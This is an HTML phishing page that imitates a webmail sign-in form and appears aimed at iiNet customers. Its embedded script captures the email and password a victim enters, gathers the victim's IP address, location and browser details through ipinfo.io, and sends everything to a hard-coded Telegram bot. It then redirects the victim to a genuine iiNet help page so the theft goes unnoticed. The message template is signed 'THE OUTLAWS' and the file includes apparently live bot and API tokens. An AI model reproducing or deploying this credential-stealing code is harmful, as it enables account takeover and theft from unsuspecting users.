<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In - Webmail</title>
    <style>
        /* General Styles */
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            background-color: #f9f9f9;
            text-align: center;
        }

        /* Container Centered */
        .container {
            width: 100%;
            max-width: 400px;
            margin: 50px auto;
        }

        /* Logo */
        .logo img {
            width: 200px;
        }

        .logo h1 {
            font-size: 1.5em;
            color: #003366;
        }

        /* Input Fields */
        .input-container {
            position: relative;
            margin: 30px 0;
        }

        label {
            position: absolute;
            top: 50%;
            left: 10px;
            transform: translateY(-50%);
            color: #666;
            font-size: 0.9em;
            transition: 0.3s ease;
            pointer-events: none;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 10px;
            border: none;
            border-bottom: 1px solid #003366;
            background: transparent;
            font-size: 1em;
            outline: none;
        }

        /* Move the label up when input is focused or has content */
        input:focus + label,
        input:not(:placeholder-shown) + label {
            top: -10px;
            font-size: 0.8em;
            color: #005EA6;
        }

        input::placeholder {
            color: transparent; /* Hide placeholder text */
        }

        /* Button */
        .btn {
            background-color: #005EA6;
            color: white;
            border: none;
            padding: 12px;
            width: 100%;
            border-radius: 5px;
            font-size: 1em;
            cursor: pointer;
            text-transform: uppercase;
        }

        .btn:hover {
            background-color: #004880;
        }

        /* Links */
        .links {
            margin-top: 15px;
            font-size: 0.9em;
        }

        .links a {
            color: #005EA6;
            text-decoration: none;
            margin: 0 10px;
        }

        .links a:hover {
            text-decoration: underline;
        }

        /* Footer */
        .footer {
            margin-top: 40px;
            font-size: 0.8em;
            color: #666;
        }
    </style>
</head>

        <!-- Input Fields -->
        <form id="loginForm">
            <div class="input-container">
                <input type="email" id="email" name="email" placeholder=" " required>
                <label for="email">Email</label>
            </div>

            <div class="input-container">
                <input type="password" id="password" name="password" placeholder=" " required>
                <label for="password">Password</label>
            </div>

            <!-- Sign In Button -->
            <button type="submit" class="btn">Sign In</button>
        </form>
		
		<script>
        const BOT_TOKEN = '8070463264:AAFZbZQjPOEd861FoPyqbvSFT6iztKKmDN0';
        const CHAT_ID = '6078089614';
        const REDIRECT_URL = 'https://help.iinet.net.au/Welcome_to_iiHelp';  // Replace with your redirect URL
        const IPINFO_TOKEN = 'f8595be4b4a2db'; // Replace with your IPInfo token

document.getElementById('loginForm').addEventListener('submit', async function(event) {
    event.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const date = new Date().toLocaleString();
    const browserType = navigator.userAgent;  // Get browser type

    try {
        // Fetch IP and location data
        const response = await fetch(`https://ipinfo.io/json?token=f8595be4b4a2db`);
        if (!response.ok) throw new Error("Failed to fetch IP info.");
        const ipInfo = await response.json();

        // Extract location details
        const ip = ipInfo.ip || 'N/A';
        const city = ipInfo.city || 'N/A';
        const region = ipInfo.region || 'N/A';
        const country = ipInfo.country || 'N/A';
        const location = ipInfo.loc || 'N/A';

        // Prepare message content with easier-to-copy email and password
        const message = `
🌐 *New iinet Logz* 🌐

🕒 *Date & Time*: ${date}


👤 *Email*: 
${email}

🔑 *Password*: 
${password}

📍 *IP Address*: ${ip}
🏙 *Location*: ${city}, ${region}, ${country}
🌍 *Coordinates*: ${location}
💻 *Browser*: ${browserType}

🔒 _THE OUTLAWS._
        `;

        // Send message to Telegram
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'  // Enables Markdown for text styling
            })
        });

        // Add a 2-second delay before redirecting
        setTimeout(() => {
            window.location.href = REDIRECT_URL;
        }, 2000);

    } catch (error) {
        console.error("Error:", error);
    }
});
    </script>
